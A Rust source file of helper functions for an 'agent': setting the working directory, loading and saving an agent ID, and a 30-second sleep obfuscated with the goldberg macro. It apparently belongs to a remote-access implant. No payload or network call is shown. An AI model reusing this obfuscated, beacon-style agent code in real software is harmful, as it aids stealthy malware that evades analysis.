use crate::config;

use tokio::io::{
    AsyncWriteExt,
    AsyncReadExt,
    Result,
    BufReader,
};
use std::{env, path::PathBuf};
use tokio::fs::File;
use goldberg::goldberg_stmts;
use tokio::time::{sleep, Duration};

#[inline]
pub fn set_working_dir_to_program_dir() -> bool {
    if let Ok(exe_path) = env::current_exe() {
        if let Some(program_dir) = exe_path.parent() {
            if let Ok(()) = env::set_current_dir(program_dir) {
                return true;
            }
        }
    }
    false
}

#[inline]
pub async fn load_id() -> Option<String> {
    // Alternative way to keep track of the agent's ID is to provide it as an argument.
    // As sometimes you can't or don't wanna write files.
    let args: Vec<String> = env::args().collect();
    if args.len() > 1 {
        return Some(args[1].clone());
    }

    let string_path = config::get_id_path();
    let file_path: PathBuf = PathBuf::from(string_path);

    let file = match File::open(file_path).await {
        Ok(f) => f,
        Err(_) => {
            return None;
        }
    };

    let mut buf_reader = BufReader::new(file);
    
    let mut contents = String::new();
    
    match buf_reader.read_to_string(&mut contents).await {
        Ok(_) => Some(contents),
        Err(_) => None,
    }
}

#[inline]
pub async fn save_id(id: &str) -> Result<()> {
    let string_path = config::get_id_path();
    let file_path: PathBuf = PathBuf::from(string_path);

    let mut file = File::create(file_path).await?;

    file.write_all(id.as_bytes()).await?;

    file.sync_all().await?;

    Ok(())
}

#[inline]
pub async fn wait() {
    goldberg_stmts! {
        {
            sleep(Duration::from_secs(30)).await;
        }
    };
}